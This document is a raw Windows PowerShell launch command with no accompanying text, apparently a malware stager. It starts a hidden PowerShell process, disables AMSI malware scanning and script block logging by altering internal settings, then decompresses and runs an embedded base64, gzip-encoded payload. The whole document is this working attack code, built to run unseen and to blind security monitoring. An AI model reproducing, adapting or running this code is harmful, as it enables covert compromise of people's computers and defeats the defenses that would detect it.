
C:\Windows\SysWOW64\cmd.exe /c powershell.exe -nop -w hidden -noni -c 
if([IntPtr]::Size -eq 4) { 
    $b = $env:windir + '\sysnative\WindowsPowerShell\v1.0\powershell.exe' 
}else { 
    $b = 'powershell.exe' 
}; 
$s = New-Object System.Diagnostics.ProcessStartInfo; 
$s.FileName = $b; 
$s.Arguments = '-noni -nop -w hidden -c 
$x_wa3="ScriptBlockLogging";
If($PSVersionTable.PSVersion.Major -ge 3){ 
    $sw="EnableScriptBlockLogging";
    $p8=[Collections.Generic.Dictionary[string,System.Object]]::new(); 
    $gG0="EnableScriptBlockInvocationLogging";
    $jXZ4D=[Ref].Assembly.GetType("System.Management.Automation.Utils");
    $plhF=[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils");
    if ($plhF) { 
        $plhF.GetField( "amsiInitFailed","NonPublic,Static").SetValue($null,$true);
    }; 
    $lCj=$jXZ4D.GetField(''cachedGroupPolicySettings'',''NonPublic,Static''); 
    If ($lCj) { 
        $a938=$lCj.GetValue($null); 
        If($a938[$x_wa3]){ 
            $a938[$x_wa3][$sw]=0; 
            $a938[$x_wa3][$gG0]=0; 
        } 
        $p8.Add($gG0,0); 
        $p8.Add($sw,0); 
        $a938["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\"+$x_wa3]=$p8; 
    } Else { 
        [Ref].Assembly.GetType("System.Management.Automation.ScriptBlock").GetField("signatures","NonPublic,Static").SetValue($null,(New-Object Collections.Generic.HashSet[string]));
    }
};
&([scriptblock]::create((
    New-Object System.IO.StreamReader(
        New-Object System.IO.Compression.GzipStream((
            New-Object System.IO.MemoryStream(
                ,[System.Convert]::FromBase64String(((
                    ''H4sIAIeJG2UC/+1XbU/jOBD+3l9hrSIlkULVFvbEIiFdWqDbPRJKS8vRbrUKyTR168TFcQplb//7jfNSygJ73ElI94FIVvwyMx4/M7YfT9PYl5THhH7sku8VUnxdT3gRMTT/ku/fWUSjS3MzpoX7zCWHxBjby+URjzwaTw4OWqkQEMu8XW2DtJMEomtGITFM8he5nIGAnbPrOfiSfCfat2qb8WuPFWLrlufPgOzYcaDGTrnvKbeq/SWj0tC/ftXN8U59Uj2+ST2WGHp/nUiIqgFjukl+mGrCi/USDN2hvuAJn8rqJY13G9VBnHhTcNHaChyQMx4kulnZLEaATEWcr0kZyUUMHatdwX07CAQkiW6RsTI/nkx+N8bF3L00ljSCaieWIPiyD2JFfUiqn704YNCD6QS1+lLQOJyYJoqt+AIMLU4Zs8i/MWO4cFsi91olY1sJpbpSmBYG9Jl1OjxIGeSa+jOO5klg4pcngln5UalMy7yJvPq3o6eZs2mX3zgbAHTX6PKEZrqHpGYRByf2JBdrbGoXIgVzsgGbaNGe/Yf1SmP1UhP1Vu0Ue8ZDToPJRn0r7tr0pj38qEReTuIjmNIYjtaxF1G/zFPjuWjAlEEGR7UUc9E9Qy8GIDgCBqEnFb4qKZ6oHUdUbnSbKWUBCNvHiCboFQbbfOxMHjJD78QORAhd3sYs1aa4O6CULnbEupxdtVFIbzEvSSzSTXF7+hbpg8cgsIgdJ7QYslPJs6r+4K6TMkl9L5GluYn5E5zFtC0eJ1KkPgYVIbjoL8GnHlOIWOQzDaC57tOwnF5/Fo+WxxjuG7S0wnhgj8KhL1WqCPQ0Swuz2gfZiZYMIpTJjosT5oV4OBS7I8stL4RAf8HRchPkGa+QKSHZchPD3WdcWmRIhcTDR6GM2fVfnHhy6uTOtAQUwTGyvTVurqXKfi0+PW8sVI4WAGVwCIlQnAgeNb0EftvLDxjjQ6dlh+/lvbyX9/K/L22X+XGvHrRZ0mnV6350N7+6dPmob8sRbfLgc+/2jO6vTufHt856786dO6lzEe5ie302D2/PjuxVtzFMrxqfFqPL3nQU3c1G9zXmzq+YGzn4P8biM7fRwf85lk4+Nh8w536Q1Z17P6vn7WP8h1gW2R/n+0m2g8UuZMLM3kN7UYyHhT17M5+aw22ch1+GvZOLoc3+bF+FX2jzPmifrIOWvTqnNhseD91Ba+iPwsPDD2ZlPKCx3G1M1EW+qwhSRWP+p/2tS+Al6ud4Ipl5DC8H5HTlFX3CxUnB1LqcKg3DUEx/ASIGhvQYCXR5sdmMcV+RxJzSIUPNeaOisYNO5tVzNZNsBM0H9lh2HRyM0Eu8LLO7rHoKcShnVu1ut1ZD7le7q+3htfj6pbX4cm3ktixFHjNwNtZZZt2s0CkxjDfHC98HEunKLxB7CTyce4H0AvlOfukrCJucs20Ai5Vt8uERfghcHVc/Vq+DLFPQxA7cEE0q/rzFxrX0+uz6TZOnIC8z/AX/mDwPfb8YfVVC1awcoCfdjzseiN/bIXDpUYmCfaRhDPKHwQtAFBtmK8gqPLgbpsWnHspnqdxx8emlmODf2GZMc54PAAA='')-f''L'',''E'')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))'; 
$s.UseShellExecute = $false; 
$s.RedirectStandardOutput = $true; 
$s.WindowStyle = 'Hidden'; 
$s.CreateNoWindow = $true; 
$p = [System.Diagnostics.Process]::Start($s); 